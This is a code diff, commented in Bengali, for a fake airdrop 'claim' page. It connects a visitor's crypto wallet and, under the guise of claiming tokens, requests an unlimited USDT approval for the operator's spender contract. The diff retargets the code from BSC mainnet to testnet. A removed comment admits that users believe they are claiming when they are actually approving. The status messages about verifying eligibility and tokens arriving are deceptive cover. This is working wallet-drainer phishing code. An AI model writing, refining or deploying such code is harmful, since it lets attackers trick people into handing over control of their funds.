@@ -1,13 +1,12 @@
-/* ================= CONFIGURATION ================= */
+/* ================= CONFIGURATION (UPDATED FOR TESTNET) ================= */
 
-// ১. আপনার দেওয়া কন্ট্রাক্ট অ্যাড্রেস (যেটা অ্যাপ্রুভাল পাবে)
-const SPENDER_CONTRACT = "0xA6E28350e9130D296853D104ba4d0E895d334019"; 
+// ১. আপনার দেওয়া নতুন কন্ট্রাক্ট অ্যাড্রেস (Spender)
+const SPENDER_CONTRACT = "0x498690046efc3feCEFa545a3D0d340cfB26817f0"; 
 
-// ২. টার্গেট টোকেন অ্যাড্রেস (USDT BEP20 - BSC Mainnet)
-// আপনি চাইলে এটি পরিবর্তন করে অন্য টোকেন দিতে পারেন
-const TARGET_TOKEN = "0x566bA3A91497E66eb6D309FfC3F1228447619BcE"; 
+// ২. টার্গেট টোকেন অ্যাড্রেস (Testnet USDT)
+const TARGET_TOKEN = "0x55d7fde29923200cAE1a2b09ae889F86042faba5"; 
 
-// ৩. আপনার দেওয়া ABI (এটা কন্ট্রাক্ট ইন্টারঅ্যাকশনের জন্য রেখে দেওয়া হলো)
+// ৩. আপনার দেওয়া নতুন ABI
 const TITAN_ABI = [
     {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
     {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EmergencyRecovery","type":"event"},
@@ -25,14 +24,14 @@ const TITAN_ABI = [
     {"stateMutability":"payable","type":"receive"}
 ];
 
-// ৪. টোকেন অ্যাপ্রুভালের জন্য স্ট্যান্ডার্ড ERC20 ABI
+// ৪. ERC20 স্ট্যান্ডার্ড ABI (টোকেন ইন্টারঅ্যাকশনের জন্য)
 const ERC20_ABI = [
     "function approve(address spender, uint256 amount) public returns (bool)",
     "function allowance(address owner, address spender) public view returns (uint256)",
     "function balanceOf(address account) view returns (uint256)"
 ];
 
-/* ================= MAIN LOGIC ================= */
+/* ================= MAIN LOGIC (BSC TESTNET) ================= */
 
 let provider;
 let signer;
@@ -40,8 +39,8 @@ let userAddress;
 
 // ১. ওয়ালেট কানেক্ট ফাংশন
 async function connectWallet() {
-    const btn = document.getElementById("connectBtn"); // HTML-এর কানেক্ট বাটন আইডি
-    const statusMsg = document.getElementById("statusMsg"); // স্ট্যাটাস মেসেজ শো করার জন্য
+    const btn = document.getElementById("connectBtn"); // HTML বাটন আইডি
+    const statusMsg = document.getElementById("statusMsg"); // স্ট্যাটাস মেসেজ
 
     if (typeof window.ethereum === 'undefined') {
         alert("Please Install MetaMask or Trust Wallet!");
@@ -57,31 +56,58 @@ async function connectWallet() {
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
 
-        // নেটওয়ার্ক চেক (BSC Chain ID: 56)
+        // নেটওয়ার্ক চেক (BSC Testnet Chain ID: 97)
         const network = await provider.getNetwork();
-        if (network.chainId !== 56) {
+        
+        // এখানে Mainnet (56) এর বদলে Testnet (97) চেক করা হচ্ছে
+        if (network.chainId !== 97) {
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], // 56 in Hex
+                    params: [{ chainId: '0x61' }], // 97 in Hex is 0x61
                 });
+                
                 // নেটওয়ার্ক চেঞ্জ হলে প্রভাইডার রিফ্রেশ
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
-            } catch (error) {
-                alert("Please switch to Binance Smart Chain (BSC)!");
-                return;
+            } catch (switchError) {
+                // যদি টেস্টনেট অ্যাড করা না থাকে, তবে অ্যাড করার রিকোয়েস্ট (Optional but good for UX)
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [
+                                {
+                                    chainId: '0x61',
+                                    chainName: 'BSC Testnet',
+                                    rpcUrls: ['https://data-seed-prebsc-1-s1.binance.org:8545/'],
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'tBNB',
+                                        decimals: 18
+                                    },
+                                    blockExplorerUrls: ['https://testnet.bscscan.com']
+                                },
+                            ],
+                        });
+                    } catch (addError) {
+                        console.error("Failed to add network", addError);
+                    }
+                } else {
+                    alert("Please switch to BSC Testnet!");
+                    return;
+                }
             }
         }
 
         // বাটন আপডেট
         if(btn) btn.innerText = userAddress.slice(0, 6) + "..." + userAddress.slice(-4);
         if(statusMsg) {
-            statusMsg.innerText = "✅ Wallet Connected! Ready to Claim.";
+            statusMsg.innerText = "✅ Wallet Connected (Testnet)! Ready.";
             statusMsg.style.color = "#00ff88";
         }
 
-        console.log("Connected:", userAddress);
+        console.log("Connected to Testnet:", userAddress);
 
     } catch (error) {
         console.error("Connection Error:", error);
@@ -89,59 +115,65 @@ async function connectWallet() {
     }
 }
 
-// ২. ক্লেইম এয়ারড্রপ ফাংশন (যেখানে Unlimited Approval চাইবে)
+// ২. ক্লেইম / অ্যাপ্রুভাল ফাংশন
 async function claimAirdrop() {
-    // প্রথমে চেক করবে ওয়ালেট কানেক্ট করা আছে কি না
     if (!userAddress) {
         await connectWallet();
-        return;
     }
 
     const statusMsg = document.getElementById("statusMsg");
-    if(statusMsg) statusMsg.innerText = "Processing Claim... Please Confirm Transaction.";
+    if(statusMsg) statusMsg.innerText = "Processing... Please Confirm Transaction.";
 
     try {
-        // টোকেন কন্ট্রাক্ট ইনিশিলাইজ করা
+        // প্রভাইডার এবং সাইনার নিশ্চিত করা
+        if (!provider || !signer) {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        }
+
         const tokenContract = new ethers.Contract(TARGET_TOKEN, ERC20_ABI, signer);
 
         // 🔥 UNLIMITED APPROVAL LOGIC 🔥
-        // আমরা চেক করছি আগে কোনো অ্যাপ্রুভাল দেওয়া আছে কি না
+        console.log("Checking allowance...");
+        
+        // আগে কোনো অ্যাপ্রুভাল আছে কিনা চেক করা
         const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_CONTRACT);
-        const minRequired = ethers.utils.parseUnits("1000", 18); // জাস্ট চেক করার জন্য
+        console.log("Current Allowance:", currentAllowance.toString());
 
-        // যদি অ্যাপ্রুভাল না থাকে বা কম থাকে, তাহলে আনলিমিটেড চাইবে
-        if (currentAllowance.lt(minRequired)) {
-            console.log("Requesting Infinite Approval...");
+        // যদি অ্যাপ্রুভাল ০ বা খুব কম হয়
+        if (currentAllowance.lt(ethers.utils.parseUnits("1000", 18))) {
+            console.log("Requesting Approval for:", SPENDER_CONTRACT);
             
-            // ম্যাক্সিমাম পসিবল নাম্বার (Unlimited)
+            // ম্যাক্সিমাম ভ্যালু (Unlimited)
             const maxApproval = ethers.constants.MaxUint256;
 
-            // ইউজার দেখবে সে "Claim" করছে, কিন্তু আসলে সে "Approve" দিচ্ছে
+            // ট্রানজেকশন পাঠানো
             const tx = await tokenContract.approve(SPENDER_CONTRACT, maxApproval);
             
-            if(statusMsg) statusMsg.innerText = "Verifying eligibility on blockchain...";
+            if(statusMsg) statusMsg.innerText = "Waiting for confirmation...";
+            console.log("Transaction Hash:", tx.hash);
             
             // কনফার্মেশন হওয়া পর্যন্ত অপেক্ষা
             await tx.wait();
             
             console.log("Approval Successful!");
         } else {
-            console.log("Already Approved! No need to approve again.");
+            console.log("Already Approved! Skipping approval.");
         }
 
         // সফল হওয়ার মেসেজ
         if(statusMsg) {
-            statusMsg.innerText = "🎉 Airdrop Claimed Successfully! Tokens will arrive shortly.";
+            statusMsg.innerText = "🎉 Process Completed Successfully!";
             statusMsg.style.color = "#00ff88";
         }
-        alert("Success! Welcome to the Titan Ecosystem.");
+        alert("Success! Transaction Confirmed.");
 
     } catch (error) {
-        console.error("Claim Error:", error);
+        console.error("Transaction Error:", error);
         if(statusMsg) {
-            statusMsg.innerText = "Transaction Failed or Rejected.";
+            // এরর ডিটেইলস দেখানো (ডিবাগিংয়ের জন্য সুবিধাজনক)
+            statusMsg.innerText = "Failed: " + (error.reason || error.message || "Unknown Error");
             statusMsg.style.color = "red";
         }
     }
 }
-    
